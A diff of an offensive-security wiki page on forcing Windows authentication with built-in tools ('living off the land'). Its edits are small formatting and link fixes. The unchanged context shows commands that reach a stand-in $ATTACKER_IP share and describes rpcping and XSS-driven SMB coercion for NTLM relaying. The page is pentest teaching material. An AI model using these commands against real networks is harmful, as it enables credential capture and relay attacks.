@@ -6,7 +6,7 @@
 
 ## Theory
 
-> In the physical world, “living off the land” simply means to survive only by the resources that you can harvest from the natural land. There may be multiple reasons for doing this — perhaps you want to get “off the grid,” or maybe you have something or someone to hide from. Or maybe you just like the challenge of being self-sufficient.&#x20;
+> In the physical world, “living off the land” simply means to survive only by the resources that you can harvest from the natural land. There may be multiple reasons for doing this — perhaps you want to get “off the grid,” or maybe you have something or someone to hide from. Or maybe you just like the challenge of being self-sufficient.
 >
 > In the technology world, “living off the land” (LotL) refers to attacker behavior that uses tools or features that already exist in the target environment. ([source](https://logrhythm.com/blog/what-are-living-off-the-land-attacks/))
 
@@ -25,7 +25,7 @@ dir \\$ATTACKER_IP\something
 net use \\$ATTACKER_IP\something
 ```
 
-The rpcping command can also be used to trigger an authentication. The perk of this technique is that the auth won't carry a signing negotiation flag, hence allowing for relays&#x20;
+The rpcping command can also be used to trigger an authentication. The perk of this technique is that the auth won't carry a signing negotiation flag, hence allowing for relays
 
 ### MS-SQL queries execution
 
@@ -45,7 +45,7 @@ Internet browsers can access HTTP servers by supplying their URL (i.e. `http://$
 
 ### HTML documents / XSS
 
-HTML documents can be crafted (or injected with content when successfully exploiting an HTML injection attack such as an [Cross-Site Scripting](../../../web/inputs/xss-cross-site-scripting.md)) in way that could make browsers authenticate when accessing a remote resource. This leads to an outgoing traffic using SMB.
+HTML documents can be crafted (or injected with content when successfully exploiting an HTML injection attack such as an [Cross-Site Scripting](../../../web-services/attacks-on-inputs/xss-cross-site-scripting.md)) in way that could make browsers authenticate when accessing a remote resource. This leads to an outgoing traffic using SMB.
 
 ```markup
 <script>
